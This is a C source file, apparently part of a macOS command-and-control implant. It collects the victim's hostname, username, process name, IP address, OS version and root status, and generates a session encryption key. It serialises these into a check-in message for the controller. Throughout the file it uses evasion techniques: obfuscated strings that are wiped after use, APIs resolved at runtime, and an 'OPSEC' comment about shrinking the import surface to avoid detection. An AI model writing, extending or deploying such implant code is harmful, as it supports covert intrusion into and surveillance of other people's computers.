#include "agent_info.h"
#include "crt.h"
#include "dyld_resolve.h"
#include "strings_obf.h"

#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <pwd.h>
#include <ifaddrs.h>
#include <arpa/inet.h>
#include <sys/sysctl.h>

// Get OS version from SystemVersion.plist (same as Go agent)
static void get_os_version(char* buf, size_t buf_size) {
    // Read SystemVersion.plist and extract ProductVersion value
    DEOBF(sysver_path, OBF_SYSVER_PLIST);
    int fd = R_open(sysver_path, 0 /* O_RDONLY */, 0);
    ZERO_STR(sysver_path, OBF_SYSVER_PLIST);
    if (fd < 0) {
        ax_strncpy(buf, "unknown", buf_size);
        return;
    }

    char plist[4096];
    ssize_t n = R_read(fd, plist, sizeof(plist) - 1);
    R_close(fd);
    if (n <= 0) {
        ax_strncpy(buf, "unknown", buf_size);
        return;
    }
    plist[n] = '\0';

    // Find <key>ProductVersion</key><string>XX.X.X</string>
    const char* key = ax_strstr(plist, "ProductVersion");
    if (!key) { ax_strncpy(buf, "unknown", buf_size); return; }
    const char* sopen = ax_strstr(key, "<string>");
    if (!sopen) { ax_strncpy(buf, "unknown", buf_size); return; }
    sopen += 8; // skip "<string>"
    const char* sclose = ax_strstr(sopen, "</string>");
    if (!sclose) { ax_strncpy(buf, "unknown", buf_size); return; }

    size_t vlen = (size_t)(sclose - sopen);
    if (vlen >= buf_size) vlen = buf_size - 1;
    ax_memcpy(buf, sopen, vlen);
    buf[vlen] = '\0';
}

// Get primary IPv4 address (non-loopback, non-link-local)
static void get_primary_ip(char* buf, size_t buf_size) {
    buf[0] = '\0';
    struct ifaddrs* ifaddr;
    if (R_getifaddrs(&ifaddr) != 0) return;

    for (struct ifaddrs* ifa = ifaddr; ifa; ifa = ifa->ifa_next) {
        if (!ifa->ifa_addr) continue;
        if (ifa->ifa_addr->sa_family != AF_INET) continue;

        struct sockaddr_in* sa = (struct sockaddr_in*)ifa->ifa_addr;
        uint32_t addr = sa->sin_addr.s_addr;

        // Skip loopback (127.x.x.x)
        if ((addr & 0xFF) == 127) continue;
        // Skip link-local (169.254.x.x)
        if ((addr & 0xFFFF) == 0xFEA9) continue;

        R_inet_ntop(AF_INET, &sa->sin_addr, buf, (socklen_t)buf_size);
    }

    R_freeifaddrs(ifaddr);
}

int create_session_info(mp_writer_t* w, uint8_t* session_key) {
    // Generate random session key (16 bytes for AES-128)
    if (ax_random_bytes(session_key, 16) != 0) return -1;

    // Gather system information
    char hostname[256] = {0};
    R_gethostname(hostname, sizeof(hostname));

    char username[256] = {0};
    struct passwd* pw = (struct passwd*)R_getpwuid(R_getuid());
    if (pw && pw->pw_name) {
        ax_strncpy(username, pw->pw_name, sizeof(username) - 1);
    }

    char process[1024] = {0};
    {
        // Use sysctl(KERN_PROCARGS2) instead of _NSGetExecutablePath
        // to avoid direct dyld import (OPSEC: reduces IAT surface)
        int mib[3] = {CTL_KERN, KERN_PROCARGS2, (int)R_getpid()};
        size_t sz = 0;
        R_sysctl(mib, 3, (void*)0, &sz, (void*)0, 0);
        if (sz > 0 && sz < 65536) {
            uint8_t* data = (uint8_t*)ax_malloc(sz);
            if (R_sysctl(mib, 3, data, &sz, (void*)0, 0) == 0 && sz > sizeof(int)) {
                // Layout: [argc:4B][exec_path\0][args...]
                const char* path = (const char*)(data + sizeof(int));
                // Extract basename
                const char* last = path;
                for (const char* p = path; *p; p++) {
                    if (*p == '/') last = p + 1;
                }
                ax_strncpy(process, last, sizeof(process) - 1);
            } else {
                ax_strcpy(process, "unknown");
            }
            ax_free(data, sz);
        } else {
            ax_strcpy(process, "unknown");
        }
    }

    char ip[64] = {0};
    get_primary_ip(ip, sizeof(ip));

    char os_version[64] = {0};
    get_os_version(os_version, sizeof(os_version));

    int pid = (int)R_getpid();
    int elevated = (R_geteuid() == 0) ? 1 : 0;

    // Write SessionInfo as msgpack map
    // vmihailenco/msgpack v5 serializes in DECLARATION order (not alphabetical)
    // Go struct order: process, pid, user, host, ipaddr, elevated, acp, oem, os, os_version, encrypt_key
    mp_write_map(w, 11);

    mp_write_kv_str(w, "process", process);
    mp_write_kv_int(w, "pid", pid);
    mp_write_kv_str(w, "user", username);
    mp_write_kv_str(w, "host", hostname);
    mp_write_kv_str(w, "ipaddr", ip);
    mp_write_kv_bool(w, "elevated", elevated);
    mp_write_kv_uint(w, "acp", 65001);        // UTF-8 code page
    mp_write_kv_uint(w, "oem", 65001);
    mp_write_kv_str(w, "os", "darwin");
    mp_write_kv_str(w, "os_version", os_version);
    mp_write_kv_bin(w, "encrypt_key", session_key, 16);

    return 0;
}
